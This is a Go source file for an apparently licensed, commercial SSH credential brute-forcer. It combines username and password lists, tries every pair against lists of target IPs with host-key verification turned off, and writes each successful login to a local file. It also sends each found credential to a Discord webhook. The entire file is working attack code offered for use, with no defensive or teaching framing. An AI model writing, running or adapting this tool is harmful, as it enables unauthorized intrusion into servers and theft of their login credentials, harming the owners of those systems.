package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"math"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var startTime time.Time
var totalIPCount int
var stats = struct{ goods, errors int }{0, 0}
var ipFile string
var timeout int
var maxConnections int

var (
	successfulIPs = make(map[string]struct{})
	mapMutex      sync.Mutex
	user_data     map[string]interface{}
	user_license  string
)

// Configuration variables
const (
	APIEndpoint = "http://your-api-endpoint.com:8000/check-license"
	WebhookURL  = "https://discord.com/api/webhooks/your-webhook-url"
)

type DiscordWebhookContent struct {
	Content string `json:"content"`
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	// License validation
	validateLicense(reader)

	createComboFile(reader)
	fmt.Print("Enter the IP list file path: ")
	ipFile, _ = reader.ReadString('\n')
	ipFile = strings.TrimSpace(ipFile)

	fmt.Print("Enter the timeout value (seconds): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeout, _ = strconv.Atoi(strings.TrimSpace(timeoutStr))

	fmt.Print("Enter the maximum number of concurrent connections: ")
	maxConnectionsStr, _ := reader.ReadString('\n')
	maxConnections, _ = strconv.Atoi(strings.TrimSpace(maxConnectionsStr))

	startTime = time.Now() // Move start time here

	combos := getItems("combo.txt")
	ips := getItems(ipFile)
	totalIPCount = len(ips) * len(combos)

	var wg sync.WaitGroup
	tasks := make(chan func(), maxConnections)

	// Start workers
	for i := 0; i < maxConnections; i++ {
		go worker(&wg, tasks)
	}

	go banner()
	for _, combo := range combos {
		for _, ip := range ips {
			wg.Add(1)
			task := func(ip, combo []string) func() {
				return func() {
					checkSSH(ip[0], ip[1], combo[0], combo[1], timeout)
					wg.Done()
				}
			}(ip, combo)
			tasks <- task
		}
	}

	wg.Wait()
	close(tasks)
	banner()
	fmt.Println("Operation completed successfully!")
}

func getItems(path string) [][]string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Failed to open file: %s", err)
	}
	defer file.Close()

	var items [][]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			items = append(items, strings.Split(line, ":"))
		}
	}
	return items
}

func sendToDiscord(message string) {
	webhookMessage := DiscordWebhookContent{Content: message}
	jsonData, err := json.Marshal(webhookMessage)
	if err != nil {
		log.Printf("Error marshalling JSON: %s", err)
		return
	}

	req, err := http.NewRequest("POST", WebhookURL, bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("Error creating POST request: %s", err)
		return
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending POST request to Discord: %s", err)
		return
	}
	defer resp.Body.Close()
}

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func createComboFile(reader *bufio.Reader) {
	fmt.Print("Enter the username list file path: ")
	usernameFile, _ := reader.ReadString('\n')
	usernameFile = strings.TrimSpace(usernameFile)
	fmt.Print("Enter the password list file path: ")
	passwordFile, _ := reader.ReadString('\n')
	passwordFile = strings.TrimSpace(passwordFile)

	usernames := getItems(usernameFile)
	passwords := getItems(passwordFile)

	file, err := os.Create("combo.txt")
	if err != nil {
		log.Fatalf("Failed to create combo file: %s", err)
	}
	defer file.Close()

	for _, username := range usernames {
		for _, password := range passwords {
			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
		}
	}
}

func checkSSH(ip, port, username, password string, timeout int) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: time.Duration(timeout) * time.Second,
	}

	client, err := ssh.Dial("tcp", ip+":"+port, config)
	if err == nil {
		successKey := fmt.Sprintf("%s:%s", ip, port)

		// Lock the map for safe concurrent access
		mapMutex.Lock()
		if _, exists := successfulIPs[successKey]; !exists {
			// If this IP and port combination hasn't been recorded, add it and proceed with the logging
			successfulIPs[successKey] = struct{}{}

			// Only log and send to Discord if this is a new successful connection
			stats.goods++
			successMessage := fmt.Sprintf("%s:%s@%s:%s", ip, port, username, password)
			appendToFile(successMessage+"\n", "su-goods.txt")
			sendToDiscord("🎉 Success: " + successMessage) // Send message to Discord
		}
		mapMutex.Unlock()

		client.Close()
	} else {
		stats.errors++
	}
}

func appendToFile(data, filepath string) {
	file, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Failed to open file for append: %s", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		log.Printf("Failed to write to file: %s", err)
	}
}

func banner() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for range ticker.C {
		totalConnections := stats.goods + stats.errors
		elapsedTime := time.Since(startTime).Seconds()
		connectionsPerSecond := float64(totalConnections) / elapsedTime
		estimatedRemainingTime := float64(totalIPCount-totalConnections) / connectionsPerSecond

		clear()

		fmt.Printf("------------------------------------------------\n")
		fmt.Printf("File: %s | Timeout: %ds\n", ipFile, timeout)
		fmt.Printf("------------------------------------------------\n")
		fmt.Printf("Checked SSH: %d/%d\n", totalConnections, totalIPCount)
		fmt.Printf("Connected: %.2f IP/s\n", connectionsPerSecond)
		fmt.Printf("Elapsed Time: %s\n", formatTime(elapsedTime))
		fmt.Printf("Remaining Time: %s\n", formatTime(estimatedRemainingTime))
		fmt.Printf("Goods: %d\n", stats.goods)
		fmt.Printf("------------------------------------------------\n")
		fmt.Printf("\033[34mName: %s\033[0m\n", user_data["name"])
		fmt.Printf("\033[32mIP: %s\033[0m\n", getIPv4())
		fmt.Printf("\033[31mExpire: %s\033[0m\n", user_data["expire"])
		fmt.Printf("\033[33mLicense: %s\033[0m\n", user_license)
		fmt.Printf("------------------------------------------------\n")
		fmt.Printf("| Coded By SudoLite with ❤️ |\n")
		fmt.Printf("------------------------------------------------\n")

		if totalConnections >= totalIPCount {
			break
		}
	}
}

func worker(wg *sync.WaitGroup, tasks chan func()) {
	for task := range tasks {
		task()
	}
}

func formatTime(seconds float64) string {
	days := int(seconds) / 86400
	hours := (int(seconds) % 86400) / 3600
	minutes := (int(seconds) % 3600) / 60
	seconds = math.Mod(seconds, 60)
	return fmt.Sprintf("%02d:%02d:%02d:%02d", days, hours, minutes, int(seconds))
}

func getIPv4() string {
	resp, err := http.Get("https://api.ipify.org?format=json")
	if err != nil {
		log.Printf("Failed to get public IP: %s", err)
		return "Unknown"
	}
	defer resp.Body.Close()

	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		log.Printf("Failed to parse IP response: %s", err)
		return "Unknown"
	}

	return result["ip"]
}

func waitForKeyPress() {
	fmt.Println("Press any key to exit...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func validateLicense(reader *bufio.Reader) {
	fmt.Print("Enter your license: ")
	license, _ := reader.ReadString('\n')
	user_license = strings.TrimSpace(license)

	ip := getIPv4()

	payload := map[string]string{
		"lic": user_license,
		"ip":  ip,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("Error marshalling JSON: %s\n", err)
		waitForKeyPress()
		os.Exit(1)
	}

	resp, err := http.Post(APIEndpoint, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Printf("Error sending POST request: %s\n", err)
		waitForKeyPress()
		os.Exit(1)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		var result map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&result)
		user_data = result
		fmt.Printf("License validated successfully. Welcome, %s!\n", user_data["name"])
		time.Sleep(3 * time.Second) // Delay for 3 seconds
	} else {
		var result map[string]string
		json.NewDecoder(resp.Body).Decode(&result)
		if result["error"] == "License not found" || result["error"] == "IP not allowed" {
			fmt.Printf("Error: %s\n", result["error"])
		} else {
			fmt.Printf("Unexpected error occurred\n")
		}
		waitForKeyPress()
		os.Exit(1)
	}
}
